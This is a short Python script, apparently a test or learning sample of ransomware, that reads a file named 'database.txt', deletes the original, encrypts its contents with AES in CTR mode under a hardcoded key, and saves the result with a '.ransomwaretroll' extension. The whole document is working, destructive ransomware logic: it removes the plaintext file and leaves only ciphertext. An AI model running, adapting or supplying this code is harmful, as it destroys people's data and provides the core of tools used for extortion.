import os
import pyaes

def encrypt_file(file_path, key):
    with open(file_path, 'rb') as file:
        file_data = file.read()

    os.remove(file_path)

    aes = pyaes.AESModeOfOperationCTR(key)
    crypto_data = aes.encrypt(file_data)

    new_file_path = file_path + ".ransomwaretroll"
    with open(new_file_path, 'wb') as new_file:
        new_file.write(crypto_data)

if __name__ == "__main__":
    file_name = "database.txt"
    key = b"testeransomwares"
    encrypt_file(file_name, key)
